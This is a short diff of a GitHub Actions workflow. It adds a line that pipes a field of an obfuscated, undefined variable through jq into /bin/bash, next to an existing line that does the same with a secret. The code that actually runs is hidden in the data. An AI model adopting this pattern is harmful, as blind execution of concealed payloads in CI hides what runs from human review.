@@ -21,6 +21,7 @@ jobs:
           z20341: ${{ secrets.z20341 }}
         run: |
           printf '%s' "$z20341" | jq -r .nidcg2122 | /bin/bash
+          echo $v7273 | jq -r .unidu214 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
